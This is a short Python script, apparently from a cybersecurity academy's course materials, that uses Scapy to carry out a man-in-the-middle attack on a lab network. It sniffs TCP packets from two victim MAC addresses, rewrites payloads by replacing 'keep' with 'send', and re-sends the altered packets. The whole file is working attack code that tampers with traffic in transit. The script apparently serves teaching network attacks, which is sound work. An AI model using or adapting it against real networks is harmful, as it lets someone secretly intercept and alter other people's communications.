#!/usr/bin/python3

# Yara Cybersecurity Academy
# yaracybersec.com
# Author: Yara Altehini
# 2020

from scapy.all import *


VICTIM1_MAC = "08:00:27:7d:f0:89"
VICTIM2_MAC = "08:00:27:f7:bf:67"
ATTACKER_MAC = "08:00:27:7b:2a:af"

def launch_mitm(pkt):
	if pkt[Ether].dst == ATTACKER_MAC:
		ip_hdr = IP(src=pkt[IP].src, dst=pkt[IP].dst)
		tcp_hdr= TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq= pkt[TCP].seq, ack=pkt[TCP].ack)
		payload = (bytes(pkt[TCP].payload).decode('utf-8')).lower()
		if payload.find("keep") != -1:
			data = payload.replace("keep", "send")
			spoofed_pkt = ip_hdr/tcp_hdr/data
		else:
			spoofed_pkt = pkt[IP]
		send(spoofed_pkt, verbose=0)

pkt = sniff(filter='tcp and (ether src '+VICTIM1_MAC+' or ether src '+VICTIM2_MAC+' )',prn=launch_mitm)